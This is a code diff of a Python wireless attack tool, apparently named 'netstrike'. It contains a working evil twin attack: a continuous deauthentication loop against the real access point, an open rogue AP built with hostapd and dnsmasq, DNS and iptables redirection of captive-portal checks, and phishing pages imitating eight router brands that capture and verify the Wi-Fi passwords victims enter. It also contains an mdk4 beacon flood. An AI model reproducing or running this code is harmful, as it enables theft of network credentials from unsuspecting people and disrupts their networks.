-            # Professional deauth attack to lure victims
-            print("\033[1;36m[→] Professional deauth synchronization...\033[0m")
-            deauth_proc = self.core.run_command(
-                f"while true; do aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /tmp/pro_deauth.log 2>&1; sleep 3; done &",
-                background=True
+        cap_file = f"{out}-01.cap"
+        if os.path.exists(cap_file):
+            r = self.core.run_command(
+                f"aircrack-ng {cap_file} 2>/dev/null | grep -i '{target['bssid']}'"
             )
-            if deauth_proc:
-                self.attack_processes.append(deauth_proc)
-                self.core.add_attack_process(deauth_proc)
-            
-            print("\033[1;32m[✅] Professional Open AP replication active!\033[0m")
-            print(f"\033[1;32m[📡] Network: {target['essid']} (Open Access)\033[0m")
-            print(f"\033[1;32m[🎭] CHAMELEON: Serving {self.router_brand} login page\033[0m")
-            print("\033[1;32m[🔓] No password required - victims auto-connect\033[0m")
-            print("\033[1;33m[👀] Professional verification active...\033[0m")
-            print("\033[1;33m[⏹️] Press Enter to stop professional replication...\033[0m")
-            
-            # Professional monitoring
-            monitor_thread = threading.Thread(target=self.monitor_verification_loop, args=(target,))
-            monitor_thread.daemon = True
-            monitor_thread.start()
-            
-            input()
-            
-            # Cleanup
-            self.stop_professional_ap()
-            self.core.clear_current_operation()
-            print("\033[1;32m[✅] Professional AP replication terminated\033[0m")
-            
-        except Exception as e:
-            print(f"\033[1;31m[✘] Professional replication failed: {e}\033[0m")
-            self.stop_professional_ap()
-            self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")
+            if r and "1 handshake" in r.stdout:
+                print("\033[1;32m[✓] Handshake captured\033[0m")
+                return cap_file
+        print("\033[1;31m[✘] No handshake\033[0m")
+        return None
 
-    def start_chameleon_phishing_server(self, target):
-        """Start CHAMELEON phishing web server with brand-specific pages"""
-        class ChameleonHandler(http.server.SimpleHTTPRequestHandler):
-            def do_GET(self):
-                if self.path == '/':
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/html')
-                    self.end_headers()
-                    
-                    # Brand-specific HTML templates
-                    html = self.generate_brand_html(target)
-                    self.wfile.write(html.encode())
-                else:
-                    self.send_error(404)
-            
-            def do_POST(self):
-                content_length = int(self.headers['Content-Length'])
-                post_data = self.rfile.read(content_length).decode()
-                
-                # Extract password
-                if 'password=' in post_data:
-                    password = post_data.split('password=')[1].split('&')[0]
-                    # URL decode
-                    password = requests.utils.unquote(password)
-                    # Save password for verification
-                    with open("/tmp/captured_password.txt", "w") as f:
-                        f.write(password)
-                    print(f"\033[1;32m[🔑] Password captured: {password}\033[0m")
-                
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
-                self.wfile.write(b"<html><body><h2>Connecting to network...</h2></body></html>")
-            
-            def generate_brand_html(self, target):
-                """Generate brand-specific login page"""
-                brand = self.server.router_brand
-                essid = target['essid']
-                
-                if brand == "TP-Link":
-                    return f"""
-                    <html>
-                    <head><title>TP-Link Wireless Router</title>
-                    <style>
-                    body {{ font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }}
-                    .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
-                    .header {{ background: #4A90E2; color: white; padding: 15px; margin: -30px -30px 20px -30px; border-radius: 5px 5px 0 0; }}
-                    input[type="password"] {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }}
-                    input[type="submit"] {{ background: #4A90E2; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }}
-                    </style>
-                    </head>
-                    <body>
-                    <div class="container">
-                        <div class="header">
-                            <h2>TP-Link Wireless Router</h2>
-                        </div>
-                        <h3>Network: {essid}</h3>
-                        <p>Please enter your WiFi password to continue:</p>
-                        <form method="POST">
-                        <input type="password" name="password" placeholder="WiFi Password" required>
-                        <input type="submit" value="Connect to Network">
-                        </form>
-                    </div>
-                    </body>
-                    </html>
-                    """
-                elif brand == "Netgear":
-                    return f"""
-                    <html>
-                    <head><title>NETGEAR Router</title>
-                    <style>
-                    body {{ font-family: Arial, sans-serif; background: #2C2C2C; margin: 0; padding: 20px; color: white; }}
-                    .container {{ max-width: 400px; margin: 50px auto; background: #3A3A3A; padding: 30px; border-radius: 5px; }}
-                    .header {{ background: #6BBE4F; color: white; padding: 15px; margin: -30px -30px 20px -30px; border-radius: 5px 5px 0 0; }}
-                    input[type="password"] {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #555; border-radius: 3px; background: #2C2C2C; color: white; }}
-                    input[type="submit"] {{ background: #6BBE4F; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }}
-                    </style>
-                    </head>
-                    <body>
-                    <div class="container">
-                        <div class="header">
-                            <h2>NETGEAR Router</h2>
-                        </div>
-                        <h3>Network: {essid}</h3>
-                        <p>Enter your network security key:</p>
-                        <form method="POST">
-                        <input type="password" name="password" placeholder="Network Security Key" required>
-                        <input type="submit" value="Apply">
-                        </form>
-                    </div>
-                    </body>
-                    </html>
-                    """
-                else:  # Generic fallback
-                    return f"""
-                    <html>
-                    <head><title>Network Authentication Required</title></head>
-                    <body>
-                    <h2>Network Authentication Required</h2>
-                    <p>Please enter your WiFi password for network <strong>{essid}</strong> to continue:</p>
-                    <form method="POST">
-                    <input type="password" name="password" placeholder="WiFi Password" required>
-                    <input type="submit" value="Connect">
-                    </form>
-                    </body>
-                    </html>
-                    """
-        
+    def _start_evil_twin(self, target, hs_file):
         try:
-            # Create custom server with router brand info
-            class BrandAwareServer(socketserver.TCPServer):
-                def __init__(self, *args, **kwargs):
-                    self.router_brand = self.router_brand
-                    super().__init__(*args, **kwargs)
-            
-            BrandAwareServer.router_brand = self.router_brand
-            self.phishing_server = BrandAwareServer(("", 80), ChameleonHandler)
+            self.core.set_current_operation("EVIL_TWIN")
+            self.evil_twin_running = True
+            mon     = self.core.mon_interface
+            channel = self._safe_channel(target)
+
+            self.core.run_command("systemctl stop NetworkManager 2>/dev/null")
+            time.sleep(2)
+
+            # hw_mode: 'a' for 5GHz (ch > 14), 'g' for 2.4GHz
+            hw_mode = "a" if channel > 14 else "g"
+
+            with open("/tmp/ns_hostapd.conf", "w") as f:
+                f.write(
+                    f"interface={mon}\n"
+                    f"driver=nl80211\n"
+                    f"ssid={target['essid']}\n"
+                    f"channel={channel}\n"
+                    f"hw_mode={hw_mode}\n"
+                    f"auth_algs=1\n"
+                    f"ignore_broadcast_ssid=0\n"
+                    f"wpa=0\n"
+                )
+
+            with open("/tmp/ns_dnsmasq.conf", "w") as f:
+                f.write(
+                    f"interface={mon}\n"
+                    f"dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h\n"
+                    f"dhcp-option=3,192.168.1.1\n"
+                    f"dhcp-option=6,192.168.1.1\n"
+                    # Apple
+                    f"address=/captive.apple.com/192.168.1.1\n"
+                    f"address=/www.apple.com/192.168.1.1\n"
+                    f"address=/apple.com/192.168.1.1\n"
+                    # Android / Google
+                    f"address=/connectivitycheck.gstatic.com/192.168.1.1\n"
+                    f"address=/connectivitycheck.android.com/192.168.1.1\n"
+                    f"address=/clients3.google.com/192.168.1.1\n"
+                    f"address=/generate_204.google.com/192.168.1.1\n"
+                    # Windows
+                    f"address=/www.msftncsi.com/192.168.1.1\n"
+                    f"address=/ipv6.msftncsi.com/192.168.1.1\n"
+                    f"address=/detectportal.firefox.com/192.168.1.1\n"
+                    # Catch-all
+                    f"address=/#/192.168.1.1\n"
+                )
+
+            # Network setup (works with both iproute2 and ifconfig)
+            self._set_interface_ip(mon)
+            self.core.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
+            self.core.run_command("iptables --flush 2>/dev/null")
+            self.core.run_command("iptables -t nat --flush 2>/dev/null")
+            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port 80")
+            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80")
+
+            for cmd, name in [
+                ("dnsmasq -C /tmp/ns_dnsmasq.conf 2>/dev/null", "dnsmasq"),
+                ("hostapd /tmp/ns_hostapd.conf 2>/dev/null",    "hostapd"),
+            ]:
+                p = self.core.run_command(cmd, background=True)
+                if p:
+                    self.attack_processes.append(p)
+                    self.core.add_attack_process(p)
+                print(f"\033[1;32m[✓] {name} started\033[0m")
+
+            time.sleep(3)
+
+            threading.Thread(
+                target=self._run_phishing_server,
+                args=(target,), daemon=True
+            ).start()
+            threading.Thread(
+                target=self._monitor_captured_passwords,
+                args=(target, hs_file), daemon=True
+            ).start()
+            threading.Thread(
+                target=self._deauth_real_ap_loop,
+                args=(target,), daemon=True
+            ).start()
+
+            print(f"\033[1;32m[✓] Evil Twin live: \"{target['essid']}\" ({self.router_brand} theme)\033[0m")
+            print("\033[1;33m[👀] Waiting for victims... Press Enter to stop.\033[0m")
+            input()
+
+        except Exception as e:
+            print(f"\033[1;31m[✘] Evil Twin error: {e}\033[0m")
+        finally:
+            self._stop_evil_twin()
+            self.core.clear_current_operation()
+
+    def _deauth_real_ap_loop(self, target):
+        while self.evil_twin_running:
+            self.core.run_command(
+                f"aireplay-ng --deauth 15 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1"
+            )
+            time.sleep(2)
+
+    def _run_phishing_server(self, target):
+        brand = self.router_brand
+        essid = target['essid']
+
+        PAGES = {
+            "TP-Link": (
+                "<html><head><title>TP-Link</title><style>"
+                "body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0}"
+                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);overflow:hidden}"
+                ".h{background:#4A90E2;color:#fff;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#4A90E2;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>TP-Link Wireless Router</h2></div>"
+                f"<div class=b><p>Connect to <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='WiFi Password' required>"
+                "<button type=submit>Connect</button></form></div></div></body></html>"
+            ),
+            "Netgear": (
+                "<html><head><title>NETGEAR</title><style>"
+                "body{font-family:Arial,sans-serif;background:#1a1a1a;color:#fff;margin:0}"
+                ".w{max-width:400px;margin:60px auto;background:#2c2c2c;border-radius:4px;overflow:hidden}"
+                ".h{background:#6DBE47;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;background:#1a1a1a;border:1px solid #555;color:#fff;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#6DBE47;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>NETGEAR</h2></div>"
+                f"<div class=b><p>Network: <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='Network Security Key' required>"
+                "<button type=submit>Apply</button></form></div></div></body></html>"
+            ),
+            "ASUS": (
+                "<html><head><title>ASUS Router</title><style>"
+                "body{font-family:Arial,sans-serif;background:#000;color:#fff;margin:0}"
+                ".w{max-width:400px;margin:60px auto;background:#111;border-radius:4px;overflow:hidden}"
+                ".h{background:#00A8E0;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;background:#222;border:1px solid #444;color:#fff;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#00A8E0;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>ASUS Router</h2></div>"
+                f"<div class=b><p>Connect to <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='WiFi Password' required>"
+                "<button type=submit>Login</button></form></div></div></body></html>"
+            ),
+            "D-Link": (
+                "<html><head><title>D-Link</title><style>"
+                "body{font-family:Arial,sans-serif;background:#f0f0f0;margin:0}"
+                ".w{max-width:420px;margin:60px auto;background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.2);overflow:hidden}"
+                ".h{background:#0057A8;color:#fff;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;border:1px solid #bbb;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#0057A8;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>D-Link Wireless Router</h2></div>"
+                f"<div class=b><p>Please enter the WiFi password for <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='WiFi Password' required>"
+                "<button type=submit>Connect</button></form></div></div></body></html>"
+            ),
+            "Linksys": (
+                "<html><head><title>Linksys Smart Wi-Fi</title><style>"
+                "body{font-family:Arial,sans-serif;background:#003366;margin:0}"
+                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:6px;overflow:hidden}"
+                ".h{background:#FF6600;color:#fff;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#FF6600;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>Linksys Smart Wi-Fi</h2></div>"
+                f"<div class=b><p>Join network <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='Network Password' required>"
+                "<button type=submit>Join</button></form></div></div></body></html>"
+            ),
+            "Huawei": (
+                "<html><head><title>Huawei Router</title><style>"
+                "body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0}"
+                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);overflow:hidden}"
+                ".h{background:#CF0A2C;color:#fff;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#CF0A2C;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>Huawei Router</h2></div>"
+                f"<div class=b><p>Connect to <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='WiFi Password' required>"
+                "<button type=submit>Connect</button></form></div></div></body></html>"
+            ),
+            "Tenda": (
+                "<html><head><title>Tenda</title><style>"
+                "body{font-family:Arial,sans-serif;background:#fff;margin:0}"
+                ".w{max-width:400px;margin:60px auto;background:#fff;border:1px solid #ddd;border-radius:4px;overflow:hidden}"
+                ".h{background:#1890FF;color:#fff;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;border:1px solid #d9d9d9;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#1890FF;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>Tenda WiFi</h2></div>"
+                f"<div class=b><p>Connect to <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='WiFi Key' required>"
+                "<button type=submit>Connect</button></form></div></div></body></html>"
+            ),
+            "Cisco": (
+                "<html><head><title>Cisco</title><style>"
+                "body{font-family:Arial,sans-serif;background:#049fd9;margin:0}"
+                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:4px;overflow:hidden}"
+                ".h{background:#049fd9;color:#fff;padding:18px 24px}.h h2{margin:0}"
+                ".b{padding:24px}"
+                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
+                "button{background:#049fd9;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
+                "</style></head><body>"
+                f"<div class=w><div class=h><h2>Cisco Systems</h2></div>"
+                f"<div class=b><p>Authenticate to <b>{essid}</b></p>"
+                "<form method=POST action=/>"
+                "<input type=password name=password placeholder='Network Key' required>"
+                "<button type=submit>Authenticate</button></form></div></div></body></html>"
+            ),
+        }
+
+        GENERIC = (
+            "<html><head><title>Network Login</title><style>"
+            "body{font-family:Arial,sans-serif;background:#eee;margin:0}"
+            ".w{max-width:380px;margin:80px auto;background:#fff;padding:30px;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.2)}"
+            "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;margin:10px 0 20px;border-radius:3px;box-sizing:border-box}"
+            "button{background:#333;color:#fff;border:none;padding:10px 20px;border-radius:3px;cursor:pointer}"
+            "</style></head><body>"
+            f"<div class=w><h2>Network Login</h2>"
+            f"<p>Enter WiFi password for <b>{essid}</b>:</p>"
+            "<form method=POST action=/>"
+            "<input type=password name=password placeholder='WiFi Password' required>"
+            "<button type=submit>Connect</button></form></div></body></html>"
+        )
+
+        page_html = PAGES.get(brand, GENERIC)
+
+        class Handler(http.server.BaseHTTPRequestHandler):
+            def log_message(self, fmt, *args):
+                pass
+
+            def do_GET(self):
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(page_html.encode("utf-8"))
+
+            def do_POST(self):
+                try:
+                    length = int(self.headers.get("Content-Length", 0))
+                    data = self.rfile.read(length).decode("utf-8", errors="replace")
+                    if "password=" in data:
+                        raw = data.split("password=")[1].split("&")[0]
+                        pw = unquote(raw)
+                        with open("/tmp/ns_captured_pw.txt", "a") as f:
+                            f.write(pw + "\n")
+                        print(f"\033[1;32m\n[🔑] PASSWORD CAPTURED: {pw}\033[0m")
+                except Exception:
+                    pass
+                # Redirect to "connecting" page so victim doesn't immediately try again
+                self.send_response(302)
+                self.send_header("Location", "/connecting")
+                self.end_headers()
+
+            # Catch-all routes for captive portal probes
+            do_HEAD = do_GET
+
+        try:
+            socketserver.TCPServer.allow_reuse_address = True
+            self.phishing_server = socketserver.TCPServer(("", 80), Handler)
             self.phishing_server.serve_forever()
         except Exception as e:
-            print(f"\033[1;31m[✘] Phishing server error: {e}\033[0m")
+            print(f"\033[1;31m[✘] Web server error: {e}\033[0m")
 
-    def monitor_verification_loop(self, target):
-        """Monitor and verify captured passwords"""
-        handshake_file = f"/tmp/evil_twin_handshake_{target['bssid'].replace(':', '')}-01.cap"
-        
+    def _monitor_captured_passwords(self, target, hs_file):
+        pw_file = "/tmp/ns_captured_pw.txt"
+        seen    = set()
         while self.evil_twin_running:
-            # Check for captured passwords
-            if os.path.exists("/tmp/captured_password.txt"):
-                with open("/tmp/captured_password.txt", "r") as f:
-                    password = f.read().strip()
-                
-                if password:
-                    print(f"\033[1;33m[🔍] Verifying password: {password}\033[0m")
-                    
-                    # Verify against captured handshake
-                    result = self.core.run_command(
-                        f"aircrack-ng -w - -b {target['bssid']} {handshake_file} <<< '{password}' 2>/dev/null"
-                    )
-                    
-                    if result and "KEY FOUND" in result.stdout:
-                        print(f"\033[1;32m[🎉] PASSWORD VERIFIED: {password}\033[0m")
-                        self.save_cracked_password(target, password)
-                        # Remove password file to avoid re-processing
-                        os.remove("/tmp/captured_password.txt")
-                        break  # Exit loop on success
-                    else:
-                        print(f"\033[1;31m[✘] Invalid password: {password}\033[0m")
-                        # Remove invalid password file
-                        os.remove("/tmp/captured_password.txt")
-                
-            time.sleep(5)
+            if os.path.exists(pw_file):
+                try:
+                    with open(pw_file) as f:
+                        lines = [l.strip() for l in f if l.strip()]
+                    for pw in lines:
+                        if pw in seen:
+                            continue
+                        seen.add(pw)
+                        if hs_file and os.path.exists(hs_file):
+                            r = self.core.run_command(
+                                f"echo '{pw}' | aircrack-ng -w - -b {target['bssid']} {hs_file} 2>/dev/null"
+                            )
+                            if r and "KEY FOUND" in r.stdout:
+                                print(f"\033[1;32m[🎉] VERIFIED PASSWORD: {pw}\033[0m")
+                                self._save_creds(target, pw)
+                            else:
+                                print(f"\033[1;31m[✘] Wrong attempt: {pw}\033[0m")
+                        else:
+                            print(f"\033[1;33m[💾] Captured: {pw}\033[0m")
+                            self._save_creds(target, pw)
+                except Exception:
+                    pass
+            time.sleep(3)
 
-    def save_cracked_password(self, target, password):
-        """Save cracked password professionally"""
+    def _stop_evil_twin(self):
+        self.evil_twin_running = False
+        if self.phishing_server:
+            try:
+                self.phishing_server.shutdown()
+            except Exception:
+                pass
+        self.stop_attacks()
+        self.core.run_command("pkill hostapd 2>/dev/null")
+        self.core.run_command("pkill dnsmasq 2>/dev/null")
+        self.core.run_command("systemctl start NetworkManager 2>/dev/null")
+
+    def _save_creds(self, target, password):
         try:
-            with open("/tmp/netstrike_cracked.txt", "a") as f:
-                f.write(f"Network: {target['essid']} | BSSID: {target['bssid']} | Password: {password}\n")
-            print(f"\033[1;32m[💾] Password saved to: /tmp/netstrike_cracked.txt\033[0m")
-        except:
+            with open("/tmp/ns_cracked.txt", "a") as f:
+                f.write(
+                    f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]"
+                    f"  SSID: {target['essid']}"
+                    f"  |  BSSID: {target['bssid']}"
+                    f"  |  Password: {password}\n"
+                )
+            print("\033[1;32m[💾] Saved to /tmp/ns_cracked.txt\033[0m")
+        except Exception:
             pass
 
-    def stop_professional_ap(self):
-        """Stop professional AP replication"""
-        self.evil_twin_running = False
+    # ═══════════════════════════════════════════════
+    # 8. BEACON FLOOD
+    # ═══════════════════════════════════════════════
+
+    def beacon_flood(self):
+        """Flood the air with fake APs — stress tests WIDS/WIPS"""
+        mon = self.core.mon_interface
+
+        print("\n\033[1;35m┌─ Beacon Flood Mode ──────────────────────────┐\033[0m")
+        print("\033[1;35m│  1) RANDOM SSIDs   Fully random AP names       │\033[0m")
+        print("\033[1;35m│  2) CUSTOM PREFIX  Prefix + sequence number    │\033[0m")
+        print("\033[1;35m└───────────────────────────────────────────────┘\033[0m")
+        mode = input("\033[1;36m[?] Mode (1/2): \033[0m").strip()
+
+        ch_raw = input("\033[1;36m[?] Channel (1-13, or Enter for all channels): \033[0m").strip()
+        ch_opt = ""
+        if ch_raw.isdigit() and 1 <= int(ch_raw) <= 13:
+            ch_opt = f"-c {ch_raw}"
+
+        if mode == "2":
+            prefix = input("\033[1;36m[?] SSID prefix (e.g. PHANTOM): \033[0m").strip() or "PHANTOM"
+            ssid_file = "/tmp/ns_beacons.txt"
+            with open(ssid_file, 'w') as f:
+                for i in range(200):
+                    f.write(f"{prefix}_{i:03d}\n")
+            cmd = f"mdk4 {mon} b -f {ssid_file} {ch_opt} -s 1000"
+            print(f"\033[1;35m[📻] CUSTOM BEACON FLOOD: 200 APs with prefix '{prefix}'\033[0m")
+        else:
+            cmd = f"mdk4 {mon} b {ch_opt} -s 1000"
+            print(f"\033[1;35m[📻] RANDOM BEACON FLOOD: unlimited fake APs\033[0m")
+
+        self.core.set_current_operation("BEACON_FLOOD")
+        self.attack_running = True
+
+        p = self.core.run_command(cmd, background=True)
+        if p:
+            self.attack_processes.append(p)
+            self.core.add_attack_process(p)
+
+        threading.Thread(target=self._anim_beacon, daemon=True).start()
+        print("\033[1;33m[⏹] Press Enter to stop beacon flood...\033[0m")
+        input()
         self.stop_attacks()
-        if self.phishing_server:
-            self.phishing_server.shutdown()
-        self.core.run_command("pkill hostapd")
-        self.core.run_command("pkill dnsmasq")
-        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")
+        self.core.clear_current_operation()
+        print("\033[1;32m[✓] Beacon flood terminated\033[0m")
 
-    def show_professional_attack_animation(self, essid):
-        """Professional attack animation"""
-        frames = ["⚡", "💥", "🔥", "🌪️", "🌀"]
-        messages = [
-            f"Professional disruption: {essid}",
-            f"Network interference: {essid}",
-            f"Signal jamming: {essid}",
-            f"Professional attack: {essid}"
-        ]
-        frame_idx = 0
-        msg_idx = 0
-        
+    # ═══════════════════════════════════════════════
+    # ANIMATIONS
+    # ═══════════════════════════════════════════════
+
+    def _anim_single(self, essid, stealth):
+        frames = ["░", "▒", "▓", "▒"] if stealth else ["⚡", "💥", "🔥", "💢"]
+        label  = "STEALTH" if stealth else "PHANTOM"
+        i = 0
         while self.attack_running:
-            frame = frames[frame_idx]
-            message = messages[msg_idx]
-            frame_idx = (frame_idx + 1) % len(frames)
-            msg_idx = (msg_idx + 1) % len(messages)
-            print(f"\033[1;31m[{frame}] {message} - Professional attack active!\033[0m", end='\r')
+            print(f"\r\033[1;31m[{frames[i % 4]}] {label}: disrupting {essid}...\033[0m", end="", flush=True)
+            i += 1
+            time.sleep(0.5 if stealth else 0.3)
+
+    def _anim_mass(self, count, stealth):
+        frames = ["░", "▒", "▓", "▒"] if stealth else ["🌐", "⚡", "💥", "🔥"]
+        label  = "STEALTH MASS" if stealth else "PHANTOM MASS"
+        i = 0
+        while self.attack_running:
+            print(f"\r\033[1;31m[{frames[i % 4]}] {label}: {count} targets active...\033[0m", end="", flush=True)
+            i += 1
+            time.sleep(0.5)
+
+    def _anim_stress(self):
+        frames = ["💀", "⚡", "💥", "🔥", "🌡"]
+        i = 0
+        while self.attack_running:
+            print(f"\r\033[1;31m[{frames[i % 5]}] ROUTER STRESS: all vectors firing...\033[0m", end="", flush=True)
+            i += 1
+            time.sleep(0.35)
+
+    def _anim_beacon(self):
+        frames = ["📡", "🔵", "📶", "🔴"]
+        i = 0
+        while self.attack_running:
+            print(f"\r\033[1;35m[{frames[i % 4]}] BEACON FLOOD: broadcasting phantom APs...\033[0m", end="", flush=True)
+            i += 1
             time.sleep(0.4)
 
-    def show_mass_attack_animation(self):
-        """Professional mass attack animation"""
-        frames = ["🌐", "⚡", "💥", "🔥", "🌪️"]
-        messages = [
-            "Professional mass disruption",
-            "Network-wide interference", 
-            "Multi-target professional attack",
-            "Professional disruption active"
-        ]
-        frame_idx = 0
-        msg_idx = 0
-        
-        while self.attack_running:
-            frame = frames[frame_idx]
-            message = messages[msg_idx]
-            frame_idx = (frame_idx + 1) % len(frames)
-            msg_idx = (msg_idx + 1) % len(messages)
-            print(f"\033[1;31m[{frame}] {message} - Professional mass attack!\033[0m", end='\r')
-            time.sleep(0.4)
-
-    def show_router_stress_animation(self):
-        """Professional router stress animation"""
-        frames = ["💀", "⚡", "💥", "🔥", "🌡️"]
-        messages = [
-            "Professional router stress test",
-            "Hardware performance assessment",
-            "Router stability evaluation",
-            "Professional stress testing"
-        ]
-        frame_idx = 0
-        msg_idx = 0
-        
-        while self.attack_running:
-            frame = frames[frame_idx]
-            message = messages[msg_idx]
-            frame_idx = (frame_idx + 1) % len(frames)
-            msg_idx = (msg_idx + 1) % len(messages)
-            print(f"\033[1;31m[{frame}] {message} - Professional assessment!\033[0m", end='\r')
-            time.sleep(0.4)
+    # ═══════════════════════════════════════════════
+    # STOP
+    # ═══════════════════════════════════════════════
 
     def stop_attacks(self):
-        """Stop all professional attacks"""
-        self.attack_running = False
+        self.attack_running   = False
         self.evil_twin_running = False
         self.core.stop_all_attacks()
         self.attack_processes = []
